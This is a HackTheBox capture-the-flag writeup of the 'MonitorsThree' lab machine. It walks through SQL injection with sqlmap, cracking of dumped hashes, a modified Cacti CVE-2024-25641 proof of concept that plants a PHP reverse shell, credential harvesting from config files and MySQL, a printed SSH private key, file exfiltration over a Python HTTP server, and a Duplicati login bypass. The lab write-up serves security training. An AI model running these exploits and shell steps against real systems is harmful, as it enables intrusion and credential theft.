---
title: MonitorsThree Writeup
description: Writeup of "MonitorsThree" machine from Hackthebox
categories: [Writeups, Hackthebox]
tags: [Hackthebox]
image:
  path: /assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThreeLOGO.png
  alt: MonitorsThree Writeup
---

# MonitorsThree(M)

## Initial Foothold

Let's start with an `nmap` scan to identify open ports and services:
`nmap -A -p- -Pn 10.10.11.30 -vv`
```
PORT     STATE    SERVICE REASON         VERSION
22/tcp   open     ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0=
|   256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa
80/tcp   open     http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Added `monitorsthree.htb` to `/etc/hosts` and navigated to it:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree1.png)

Using `wfuzz`, to brute force for potential subdomains:
`wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://monitorsthree.htb" -H "Host: FUZZ.monitorsthree.htb" --hw 982`
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree2.png)

This reveals the subdomain `cacti.monitorsthree.htb`. Adding it to `/etc/hosts` and visiting it shows a Cacti installation (v1.2.26):<br>
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree3.png)

A search for `cacti 1.2.26 exploit` directs to this [CVE Details page](https://www.cvedetails.com/cve/CVE-2024-25641/), which further references an advisory on [GitHub](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88)

Exploitation of this vulnerability requires credentials. Default credentials fail, so we return to `monitorsthree.htb` and discover a login page:<br>
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree4.png)

The forgot password request was intercepted and saved using Burp Suite:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree5.png)

Used sqlmap:
`sqlmap -r req --dump --batch`

Then it is seen that username parameter is vulnerable to Blind time-based SQLi and waiting for a while for SQLMAP to do its work I finally get password hashes:
```
+----------------------------------+
| password                         |
+----------------------------------+
| 1e68b6eb86b45f6d92f8f292428f77ac |
| 31a181c8372e3afc59dab863430610e8 |
+----------------------------------+
```

The hash was successfully cracked using CrackStation:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree6.png)
`admin:greencacti2001`

Using these credentials on `cacti.monitorsthree.htb` successfully logs us in.
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree7.png)


Again let's go back to this [source](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88)

I slightly modified the PoC code to add [Pentest monkey's](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse shell in revshell.php file:
```
<?php

$shell_file_path = "./php-reverse-shell.php";
$filedata = file_get_contents($shell_file_path);

if ($filedata === false) {
    die("Failed to read the contents of shell.php. Ensure the file exists and is readable.");
}

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";

$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 

openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);

$data = sprintf(
    $xmldata,
    base64_encode($filedata),
    base64_encode($filesignature),
    base64_encode($public_key)
);

openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);

file_put_contents(
    "test.xml",
    str_replace(
        "<signature></signature>",
        "<signature>" . base64_encode($signature) . "</signature>",
        $data
    )
);

system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>

```
`php revshell.php`

On my attacker machine got my netcat listener ready:
`nc -lvnp 1234`

Within Cacti:
1. Navigate to `Import/Export -> Import Packages`
2. Upload `test.xml.gz` containing the payload.
3. Visit `http://cacti.monitorsthree.htb/cacti/resource/test.php`.

A reverse shell is established as `www-data`:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree8.png)

## Getting User Flag

To enhance shell interaction, a TTY shell was obtained:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Examining `/var/www/html/cacti/include/config.php` reveals MySQL credentials:
`cactiuser:cactiuser`
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree9.png)

Using the discovered credentials, a connection to the MySQL database was established:<br>
`mysql -h localhost -u cactiuser -p`

The following commands were executed to explore the database and extract sensitive information:
```
SHOW DATABASES;
USE cacti;
SHOW TABLES;
SELECT * FROM user_auth;
```
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree10.png)
The `user_auth` table contained hashed credentials:
`marcus:$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK`

The password hash for the `marcus` user was cracked using Hashcat:<br>
`hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt`
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree11.png)
Got password: **12345678910**

Direct SSH login using Marcus’s password was not possible due to password-based authentication being disabled. However, the `su` command was used within the `www-data` shell to switch to the `marcus` user:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree12.png)

In Marcus’s home directory, the `user.txt` flag was retrieved, along with the discovery of an SSH private key (`id_rsa`) located in the `~/.ssh` directory:
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

With the private key saved to a file and permissions adjusted (`chmod 600 id_rsa`), SSH access was obtained:<br>
`ssh marcus@10.10.11.30 -i id_rsa`

## Privilege Escalation

Running the command `ss -ltn` revealed a service listening on port `8200`:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree13.png)

To investigate further, the port was forwarded to the local machine using SSH:<br>
`ssh -L 8200:localhost:8200 marcus@10.10.11.30 -i id_rsa`

Accessing `http://localhost:8200` displayed the Duplicati login page:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree14.png)

Since the login credentials were unknown, the `/opt/duplicati/config` directory was examined. This revealed the presence of a file named `Duplicati-server.sqlite`
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree15.png)

The file was transferred to the attacker's machine for analysis:<br>
On target system: `python3 -m http.server 1234`<br>
On attacker's system: `wget 10.10.11.30:1234/Duplicati-server.sqlite`<br>

The SQLite database was opened:
`sqlite3 Duplicati-server.sqlite`

Listed tables:
`.tables`<br>
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree16.png)

Dumped **Option** table:
`select * from Option;`
```
4||encryption-module|
4||compression-module|zip
4||dblock-size|50mb
4||--no-encryption|true
-1||--asynchronous-upload-limit|50
-1||--asynchronous-concurrent-upload-limit|50
17||encryption-module|
17||compression-module|zip
17||dblock-size|50mb
17||--no-encryption|true
-2||startup-delay|0s
-2||max-download-speed|
-2||max-upload-speed|
-2||thread-priority|
-2||last-webserver-port|8200
-2||is-first-run|
-2||server-port-changed|True
-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
-2||server-passphrase-trayicon|cfaa19fb-ae3d-4183-9f74-12753f163568
-2||server-passphrase-trayicon-hash|sAdCRys6XeORxNT3xIE7LN3DwiWdkf9h0cY4kC1Y24M=
-2||last-update-check|638720785636621360
-2||update-check-interval|
-2||update-check-latest|
-2||unacked-error|False
-2||unacked-warning|False
-2||server-listen-interface|any
-2||server-ssl-certificate|
-2||has-fixed-invalid-backup-id|True
-2||update-channel|
-2||usage-reporter-level|
-2||has-asked-for-password-protection|true
-2||disable-tray-icon-login|false
-2||allowed-hostnames|*

```

I see that I get a server passphrase. But using it as a password didn't work:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree17.png)
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree18.png)

A targeted search for a Duplicati authentication bypass exploit led to the discovery of a [bypass technique](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee).

Steps to Bypass Authentication:
1. The salt presented during login matched the database value:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree19.png)![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree20.png)


2. The passphrase was decoded to hexadecimal using [cyberchef](https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)To_Hex('None',0)&input=V2I2ZTg1NUwzc045TFRhQ3V3UFh1YXV0c3dUSVFiZWttTUFyN0JySzJIbz0):
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree21.png)

3. With Burp, the login request was intercepted:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree22.png)

4. In the browser's developer console, the following JavaScript was executed:
```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('<URL decoded session-nonce>') + '<hex passphrase from cyberchef>')).toString(CryptoJS.enc.Base64);
noncedpwd
```
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree23.png)

The resulting value was URL-encoded and inserted into the intercepted login request:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree24.png)

Authentication was bypassed successfully:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree25.png)

From the Duplicati interface, the "**Commandline ...**" section was accessed:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree26.png)

A backup operation was configured to target the `/root` directory:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree27.png)
The Backup was initiated by selecting "**Run "backup" command now**":
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree28.png)


Key backup files were identified for further analysis:<br>
`duplicati-bc2d8d70b8eb74c4ea21235385840e608.dblock.zip`<br>
`duplicati-20250111T123604Z.dlist.zip`<br>

These files were downloaded from `/opt/backups/cacti` directory using Marcus’s session.

Unzipping `duplicati-20250111T123604Z.dlist.zip`:
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree29.png)

`cat filelist.json | grep root.txt`
![](/assets/blogimages/Writeups/Hackthebox/MonitorsThree/MonitorsThree30.png)

We can see /source/root/root.txt hash:
`feF8CiSNDKE+zs1yYilBfDR4uJggLrgIqE/I+PDOB0M=`

The file corresponding to this hash can be located within the archive `duplicati-bc2d8d70b8eb74c4ea21235385840e608.dblock.zip`. Upon extracting and viewing the file with the matching hash, the root flag will be revealed.

